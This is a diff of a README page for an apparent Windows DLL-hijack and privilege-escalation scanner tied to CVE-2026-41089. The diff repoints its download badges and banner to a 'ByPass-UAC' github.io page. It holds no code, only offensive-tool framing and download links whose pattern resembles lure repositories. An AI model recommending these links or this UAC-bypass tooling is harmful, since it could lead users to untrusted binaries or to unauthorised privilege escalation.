@@ -4,13 +4,13 @@
   <p><strong>Streamlined Vulnerability Discovery for Windows Privilege Escalation</strong></p>
  <hr>
   <p>
-<a href="https://hydrasoft.github.io/HydraSoft-DLL-Hijack-Scanner" rel="nofollow"><img src="https://img.shields.io/badge/Download%20Build-d90429?style=for-the-badge&amp;logo=windows&amp;logoColor=white" alt="Download Release" style="max-width: 100%;"></a>
-<a href="https://hydrasoft.github.io/HydraSoft-DLL-Hijack-Scanner" rel="nofollow"><img src="https://img.shields.io/badge/Download%20Release-00509d?style=for-the-badge&amp;logo=delphi&amp;logoColor=white" alt="View Source" style="max-width: 100%;"></a>
+<a href="https://hydrasoft.github.io/HydraSoft-DLL-Hijack-Scanner-ByPass-UAC" rel="nofollow"><img src="https://img.shields.io/badge/Download%20Build-d90429?style=for-the-badge&amp;logo=windows&amp;logoColor=white" alt="Download Release" style="max-width: 100%;"></a>
+<a href="https://hydrasoft.github.io/HydraSoft-DLL-Hijack-Scanner-ByPass-UAC" rel="nofollow"><img src="https://img.shields.io/badge/Download%20Release-00509d?style=for-the-badge&amp;logo=delphi&amp;logoColor=white" alt="View Source" style="max-width: 100%;"></a>
   </p>
 
  
   <p align="center">
-    <img width="100%" alt="CVE-2026-41089 Abstract" src="https://github.com/HydraSoft/HydraSoft-DLL-Hijack-Scanner/blob/main/hydrabanner.jpg" style="max-width: 100%; border-radius: 8px;">
+    <img width="100%" alt="CVE-2026-41089 Abstract" src="https://github.com/HydraSoft-DLL-Hijack-Scanner-ByPass-UAC/blob/main/hydrabanner.jpg" style="max-width: 100%; border-radius: 8px;">
   </p>
    <hr>
   <h2>🧠 Conceptual Overview</h2>
@@ -168,7 +168,7 @@
   <h2>🔄 Download &amp; Contribution</h2>
 
   <p>
-    <a href="https://hydrasoft.github.io/HydraSoft-DLL-Hijack-Scanner" rel="nofollow">
+    <a href="https://hydrasoft.github.io/HydraSoft-DLL-Hijack-Scanner-ByPass-UAC" rel="nofollow">
       <img
         src="https://img.shields.io/badge/Download%20Latest%20Build-d90429?style=for-the-badge&amp;logo=github&amp;logoColor=white"
         alt="Download Repository"
